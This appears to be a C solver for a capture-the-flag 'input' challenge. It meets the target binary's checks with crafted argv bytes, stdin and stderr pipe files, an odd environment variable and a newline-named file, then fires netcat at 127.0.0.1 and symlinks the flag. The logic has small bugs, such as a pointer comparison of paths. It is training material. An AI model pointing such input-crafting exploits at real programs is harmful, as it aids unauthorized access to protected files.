#include <limits.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
char* path;
char* nc_path;
char* nc_dirs[] = {"/usr/bin/nc", "/bin/nc"}; // 0=most gnu, 1=bsd(pwnable server)
char* port;
char* flag_path;
int get_netcat() {
    for(int i=0;i<2;i++) {
       if(access(nc_dirs[i], X_OK) == 0) {
            nc_path = nc_dirs[i];
            return 0;
        }
    }
    return 1;
}
int main(int argc, char* argv[]) 
{
    if(argc < 3)  // no args
    { 
        puts("EXPLOIT: ./exploit [path to target] [path to flag] (port=6666)");
        return 1;
    }     
    path = argv[1];
    if(access(path, X_OK) != 0) {
        puts("[!] Incorrect target path or no permission to execute");
        return 1;
    }
    if(access(argv[2], F_OK) != 0) {
        puts("[!] Incorrect path to flag");
    }
    char pwd[PATH_MAX+4];
    getcwd(pwd, sizeof(pwd));
    strcat(pwd, "flag");
    if(argv[2] != pwd) // if flag isnt in current dir, symlink it(cat flag is hardcoded in target)
    {
        printf("[i] Creating symlink to %s\n", argv[2]);
        symlink(argv[2], "flag");
    }
    if(argc == 4)
    {
        port = argv[3];
    } else
    {
        port = "6666";
    }
    puts("[*] Finding netcat...");
    if(get_netcat() == 0) {
        printf("[*] --Found: %s\n", nc_path);
    } else {
        puts("[!] Install/Have permission to execute netcat");
        return 1;
    }
    puts("[*] Setting up..");
	char* args[101];
	char* envs[2];
	args[100] = 0x00;
	for(int i=0;i<100;i++){
	    args[i] = "";
		switch(i) {
			case 0x41:
				args[i] = "\x00";
				break;
			case 0x42:
				args[i] = "\x20\x0a\x0d";
				break;
			case 0x43:
				args[i] = port;
				break;
			default:
				args[i] = "A";
				break;
		}
	}
	puts("[*] --Done");
	//pt2
	puts("[*] Part 2\n[*] --Setting stdin/stderr pipes");
	int pipein = open("./pipein", O_RDWR | O_CREAT | O_TRUNC);
	int pipeerr = open("./pipeerr", O_RDWR | O_CREAT | O_TRUNC);
	fchmod(pipein, S_IREAD | S_IWRITE | S_IRGRP | S_IROTH);
    fchmod(pipeerr, S_IREAD | S_IWRITE | S_IRGRP | S_IROTH);
    write(pipein, "\x00\x0a\x00\xff", 4);
	write(pipeerr, "\x00\x0a\x02\xff", 4);
    lseek(pipein, 0, SEEK_SET);
    lseek(pipeerr, 0, SEEK_SET);
    dup2(pipein, 0);
	dup2(pipeerr, 2);
	close(pipein);
    close(pipeerr);
    //pt3
	puts("[*] Part 3\n[*] --Setting env vars");
	envs[0] = "\xde\xad\xbe\xef=\xca\xfe\xba\xbe";
	envs[1] = "\x00";
    //pt4
	puts("[*] Part 4\n[*] --Creating file");	
	int newfile = open("./\x0a", O_CREAT|O_WRONLY);
	puts("[*] --Setting perms");
    if(fchmod(newfile, S_IREAD | S_IWRITE | S_IRGRP | S_IROTH) != 0) {
		puts("[*] --Error setting perms");
		return 1;
	}
	write(newfile, "\x00\x00\x00\x00", 4);
	close(newfile);
	puts("[*] Part 5\n[*] --Setting up netcat");
    if(fork() != 0) {
        sleep(1);
        dup2(1, 2);
        char* nc_envs[] = {NULL};
        char* nc_args[] = {"nc", "127.0.0.1", port, 0x00};
        int nc_pipe = open("./ncpipe", O_CREAT|O_RDWR|O_TRUNC);
        fchmod(nc_pipe, S_IREAD | S_IWRITE | S_IRGRP | S_IROTH);
        write(nc_pipe, "\xde\xad\xbe\xef",4);
        lseek(nc_pipe, 0, SEEK_SET);
        dup2(nc_pipe, 0); 
        close(nc_pipe);
        puts("[*] --Connecting");
        execve(nc_path, nc_args, nc_envs);
    }
	puts("[*] Executing target.");
    execve(path, args, envs);
	return 0;
}
